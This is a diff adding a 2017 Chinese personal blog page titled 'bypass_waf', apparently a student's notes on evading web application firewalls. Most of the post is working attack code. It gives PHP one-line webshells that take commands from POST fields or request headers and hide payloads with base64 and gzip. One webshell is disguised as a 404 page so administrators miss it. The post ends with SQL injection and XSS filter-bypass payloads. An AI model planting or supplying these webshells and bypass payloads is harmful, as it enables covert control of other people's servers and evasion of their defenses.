@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>bypass_waf | Merl1ng</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post d">
+<meta name="keywords">
+<meta property="og:type" content="article">
+<meta property="og:title" content="bypass_waf">
+<meta property="og:url" content="http://Merl1ng.com/2017/07/20/bypass_waf/index.html">
+<meta property="og:site_name" content="Merl1ng">
+<meta property="og:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post d">
+<meta property="og:updated_time" content="2017-07-20T14:34:41.261Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="bypass_waf">
+<meta name="twitter:description" content="听学长说现在web很多都要花式bypass waf刚好才理解一点一句话木马看到一篇升级版一句话即关于其无特征bupass waf的文章 先记录下来 （也看到了一篇sql和xss绕waf的 挺不错的 记录在下面） 姿势一 php动态函数 （无eval）&amp;lt;?php $_POST[&amp;#39;xx&amp;#39;]($_POST[&amp;#39;oo&amp;#39;]);?&amp;gt;利用 在hackbar Post d">
+  
+    <link rel="alternate" href="/atom.xml" title="Merl1ng" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Merl1ng</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://Merl1ng.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-bypass_waf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2017/07/20/bypass_waf/" class="article-date">
+  <time datetime="2017-07-20T13:44:22.000Z" itemprop="datePublished">2017-07-20</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      bypass_waf
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>听学长说现在web很多都要花式bypass waf<br>刚好才理解一点一句话木马看到一篇升级版一句话<br>即关于其无特征bupass waf的文章 先记录下来</p>
+<p>（也看到了一篇sql和xss绕waf的 挺不错的 记录在下面）</p>
+<p>姿势一 php动态函数 （无eval）<br><code>&lt;?php $_POST[&#39;xx&#39;]($_POST[&#39;oo&#39;]);?&gt;</code><br>利用 在hackbar Post data<br>写入xx=assert￥oo=QAQ</p>
+<p>姿势二 无Post<br>getallheaders函数能够获取请求头内容<br><code>&lt;?php eval(getallheaders()[&#39;Accept-Language&#39;]);&gt;</code><br>结合姿势一<br><code>&lt;?php $a=getallheaders()[&#39;xxx&#39;];$a(getallheaders()[&#39;ooo&#39;]);&gt;</code></p>
+<p>姿势三 遇到会检测http请求头内容的waf<br><code>&lt;?php eval(gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;])));&gt;</code><br>解开之后发现是乱码，waf识别不出来里面的内容<br>结合姿势一<br><code>&lt;?php $xx=gzuncompress(base64_decode(getallheaders()[&#39;xx&#39;]));$xx(gzuncompress(base64_decode(getallheaders()[&#39;oo&#39;])));&gt;</code></p>
+<p>姿势四 防止管理员删shell&gt;伪装成404</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</div><div class="line">&lt;html&gt;&lt;head&gt;</div><div class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</div><div class="line">&lt;/head&gt;&lt;body&gt;</div><div class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</div><div class="line">&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;</div><div class="line"> </div><div class="line">...</div><div class="line"> </div><div class="line">&lt;?php</div><div class="line">$xx=getallheaders()[&apos;xx&apos;];</div><div class="line">$oo=getallheaders()[&apos;oo&apos;];</div><div class="line">if($xx!=&quot;&quot; and $oo!=&quot;&quot;)&#123;</div><div class="line">  $xx=gzuncompress(base64_decode($xx));$xx(gzuncompress(base64_decode($oo)));</div><div class="line">&#125;</div><div class="line">&gt;</div><div class="line">&lt;/body&gt;&lt;/html&gt;</div></pre></td></tr></table></figure>
+<p>SQl XSS bypass waf</p>
+<p>姿势一 大小写转换<br>SQL：<code>sEleCt vERsIoN()</code><br>XSS：<code>&lt;sCrIpt&gt;aleRt(1)&lt;/scrIpt&gt;</code></p>
+<p>姿势二 字符编码<br>SQL：<code>load_file(0x633A2F77696E646F77732F6D792E696E69)</code><br>XSS：<code>&lt;script%20src%3D&quot;http%3A%2F%2F0300.0250.0000.0001&quot;&gt;&lt;%2Fscript&gt;</code></p>
+<p>姿势三 拼凑法 其只验证一次<br>SQL：<code>selselectect verversionsion();</code><br>XSS：<code>&lt;scr&lt;script&gt;rip&gt;alalertert&lt;/scr&lt;/script&gt;rip&gt;</code></p>
+<p>还有站在webkit角度的xss bypass 暂时看不懂 先不记录</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://Merl1ng.com/2017/07/20/bypass_waf/" data-id="cj5cignvb0000o4euqtjtuz5v" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2017/07/18/一句话木马和中国菜刀/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          一句话木马和中国菜刀
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/05/">May 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2017/07/20/bypass_waf/">bypass_waf</a>
+          </li>
+        
+          <li>
+            <a href="/2017/07/18/一句话木马和中国菜刀/">一句话木马和中国菜刀</a>
+          </li>
+        
+          <li>
+            <a href="/2017/05/30/局域网/">局域网</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/30/环境变量/">环境变量</a>
+          </li>
+        
+          <li>
+            <a href="/2017/04/14/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2017 Saber<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+  </div>
+</body>
+</html>
